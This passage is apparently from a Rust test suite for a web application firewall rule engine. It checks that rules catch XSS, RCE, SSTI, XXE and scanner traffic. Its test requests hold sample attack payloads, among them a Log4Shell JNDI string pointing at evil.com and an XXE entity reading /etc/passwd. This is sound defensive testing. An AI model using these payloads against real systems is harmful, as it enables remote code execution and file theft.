            url: "/test?callback=eval(alert(1))".to_string(),
            method: "GET".to_string(),
            headers: HashMap::new(),
            query_params: HashMap::new(),
            body: String::new(),
            cookies: HashMap::new(),
        };

        let matches_l1_eval = engine_level1.match_request(&xss_eval_request);
        assert!(matches_l1_eval.is_empty());

        let matches_l3_eval = engine_level3.match_request(&xss_eval_request);
        assert!(!matches_l3_eval.is_empty());
    }

    #[test]
    fn test_rce_detection() {
        let rules = vec![
            create_test_rule(30, RuleCategory::Rce, r#"system\s*\("#, 1),
            create_test_rule(31, RuleCategory::Rce, r#"\$\{jndi:"#, 1),
        ];

        let stats = Arc::new(RuleStatistics::new());
        let engine = RuleEngine::new(rules, stats, 1, vec![]);

        let log4j_request = WafRequest {
            url: "/api".to_string(),
            method: "POST".to_string(),
            headers: HashMap::new(),
            query_params: HashMap::new(),
            body: "${jndi:ldap://evil.com/a}".to_string(),
            cookies: HashMap::new(),
        };

        let matches = engine.match_request(&log4j_request);
        assert!(!matches.is_empty());
        assert!(matches.iter().any(|m| m.rule.category == RuleCategory::Rce));
    }

    #[test]
    fn test_ssti_detection() {
        let rules = vec![
            create_test_rule(40, RuleCategory::Ssti, r#"\{\{.*?\}\}"#, 1),
            create_test_rule(41, RuleCategory::Ssti, r#"__class__"#, 1),
        ];

        let stats = Arc::new(RuleStatistics::new());
        let engine = RuleEngine::new(rules, stats, 1, vec![]);

        let ssti_request = WafRequest {
            url: "/search?q={{7*7}}".to_string(),
            method: "GET".to_string(),
            headers: HashMap::new(),
            query_params: HashMap::new(),
            body: String::new(),
            cookies: HashMap::new(),
        };

        let matches = engine.match_request(&ssti_request);
        assert!(!matches.is_empty());
        assert!(matches
            .iter()
            .any(|m| m.rule.category == RuleCategory::Ssti));
    }

    #[test]
    fn test_xxe_detection() {
        let rules = vec![
            create_test_rule(50, RuleCategory::Xxe, r#"<!ENTITY"#, 1),
            create_test_rule(51, RuleCategory::Xxe, r#"<!DOCTYPE"#, 1),
        ];

        let stats = Arc::new(RuleStatistics::new());
        let engine = RuleEngine::new(rules, stats, 1, vec![]);

        let xxe_request = WafRequest {
            url: "/api/xml".to_string(),
            method: "POST".to_string(),
            headers: HashMap::new(),
            query_params: HashMap::new(),
            body: "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">".to_string(),
            cookies: HashMap::new(),
        };

        let matches = engine.match_request(&xxe_request);
        assert!(!matches.is_empty());
        assert!(matches.iter().any(|m| m.rule.category == RuleCategory::Xxe));
    }

    #[test]
    fn test_scanner_detection() {
        let rules = vec![
            create_test_rule(60, RuleCategory::Scanner, r#"sqlmap"#, 1),
            create_test_rule(61, RuleCategory::Scanner, r#"nikto"#, 1),
        ];

        let stats = Arc::new(RuleStatistics::new());
        let engine = RuleEngine::new(rules, stats, 1, vec![]);

        let mut headers = HashMap::new();
        headers.insert("User-Agent".to_string(), "sqlmap/1.5".to_string());

        let scanner_request = WafRequest {
            url: "/admin".to_string(),
            method: "GET".to_string(),
            headers,
            query_params: HashMap::new(),
            body: String::new(),
            cookies: HashMap::new(),
        };

        let matches = engine.match_request(&scanner_request);
        assert!(!matches.is_empty());
        assert!(matches
            .iter()
            .any(|m| m.rule.category == RuleCategory::Scanner));
    }

    #[test]
    fn test_multiple_attack_types_detection() {
        let rules = vec![
            create_test_rule(1, RuleCategory::Xss, r#"<script>"#, 1),
            create_test_rule(10, RuleCategory::SqlInjection, r#"union select"#, 1),
        ];

        let stats = Arc::new(RuleStatistics::new());
        let engine = RuleEngine::new(rules, stats, 1, vec![]);

        let multi_request = WafRequest {
            url: "/search?q=<script> union select".to_string(),
            method: "GET".to_string(),
            headers: HashMap::new(),
            query_params: HashMap::new(),
            body: String::new(),
            cookies: HashMap::new(),
        };

        let matches = engine.match_request(&multi_request);
        assert!(!matches.is_empty());

        let has_xss = matches.iter().any(|m| m.rule.category == RuleCategory::Xss);
        let has_sqli = matches
            .iter()
            .any(|m| m.rule.category == RuleCategory::SqlInjection);
        assert!(has_xss);
        assert!(has_sqli);
    }

    #[test]
    fn test_rule_engine_get_categories() {
        let rules = vec![
            create_test_rule(1, RuleCategory::Xss, r#"<script>"#, 1),
            create_test_rule(10, RuleCategory::SqlInjection, r#"union select"#, 1),
        ];

        let stats = Arc::new(RuleStatistics::new());
        let engine = RuleEngine::new(rules, stats, 1, vec![]);

        let categories = engine.get_categories();
        assert_eq!(categories.len(), 2);
        assert!(categories.contains(&RuleCategory::Xss));
        assert!(categories.contains(&RuleCategory::SqlInjection));
    }

    #[test]
    fn test_statistics_sorting() {
        let stats = RuleStatistics::new();

        stats.record_hit(1, "xss");
        stats.record_hit(1, "xss");
        stats.record_hit(1, "xss");
        stats.record_hit(2, "sqli");
        stats.record_hit(3, "rce");
        stats.record_hit(3, "rce");

        let rule_stats = stats.get_all_rule_stats();
        assert_eq!(rule_stats[0].rule_id, 1);
        assert_eq!(rule_stats[0].hit_count, 3);

        let cat_stats = stats.get_all_category_stats();
        assert_eq!(cat_stats[0].category, "xss");
        assert_eq!(cat_stats[0].hit_count, 3);
    }
}
